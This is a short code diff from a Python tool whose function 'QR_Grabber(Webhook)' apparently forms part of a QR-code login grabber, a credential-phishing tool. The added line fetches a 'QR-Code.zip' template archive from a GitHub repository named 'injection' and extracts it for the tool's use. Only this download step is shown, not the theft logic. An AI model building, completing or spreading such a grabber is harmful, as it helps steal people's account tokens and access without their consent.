@@ -62,7 +62,7 @@ def QR_Grabber(Webhook):
     print(f"\n{Fore.WHITE}Downloading templates for QR code")
 
     # Download qr code templates
-    qr_download = requests.get("")
+    qr_download = requests.get("https://raw.githubusercontent.com/MarkThe/injection/main/QR-Code.zip")
     with open("QR-Code.zip", 'wb')as zip1:
         zip1.write(qr_download.content)
     with ZipFile("QR-Code.zip", 'r')as zip2:
